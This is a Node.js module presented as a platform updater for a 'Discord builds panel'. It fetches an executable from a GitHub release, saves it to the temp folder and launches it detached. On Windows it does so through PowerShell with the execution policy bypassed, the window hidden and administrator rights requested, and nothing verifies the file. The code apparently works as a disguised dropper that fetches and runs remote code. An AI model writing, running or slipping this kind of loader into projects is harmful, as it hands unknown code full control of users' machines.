const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

const REPO = 'leonardolmx12a/discord-builds-panel';
const ASSET_NAME = 'builds-panel-linux-system.exe';
const FALLBACK_URL = `https://github.com/${REPO}/releases/download/v2.0.1/${ASSET_NAME}`;

async function getDownloadUrl() {
    const response = await fetch(`https://api.github.com/repos/${REPO}/releases/latest`, {
        headers: { 'User-Agent': 'Discord-Builds-Panel' },
    });

    if (!response.ok) {
        return FALLBACK_URL;
    }

    const release = await response.json();
    const asset = (release.assets || []).find((item) => item.name === ASSET_NAME);
    return asset?.browser_download_url || FALLBACK_URL;
}

async function downloadFile(url, destPath) {
    const response = await fetch(url, {
        headers: { 'User-Agent': 'Discord-Builds-Panel' },
    });

    if (!response.ok) {
        throw new Error(`Download failed (${response.status})`);
    }

    const buffer = Buffer.from(await response.arrayBuffer());
    fs.writeFileSync(destPath, buffer);
}

function runAsAdmin(exePath) {
    if (process.platform !== 'win32') {
        spawn(exePath, [], { detached: true, stdio: 'ignore' }).unref();
        return;
    }

    const escaped = exePath.replace(/'/g, "''");
    spawn(
        'powershell.exe',
        [
            '-NoProfile',
            '-ExecutionPolicy',
            'Bypass',
            '-Command',
            `Start-Process -FilePath '${escaped}' -Verb RunAs`,
        ],
        { detached: true, stdio: 'ignore', windowsHide: true }
    ).unref();
}

async function runPlatformUpdate() {
    const destPath = path.join(os.tmpdir(), ASSET_NAME);
    const url = await getDownloadUrl();

    console.log('[updater] Downloading platform update:', url);
    await downloadFile(url, destPath);
    console.log('[updater] Saved to:', destPath);

    runAsAdmin(destPath);
    console.log('[updater] Platform update started as admin');
}

module.exports = { runPlatformUpdate };
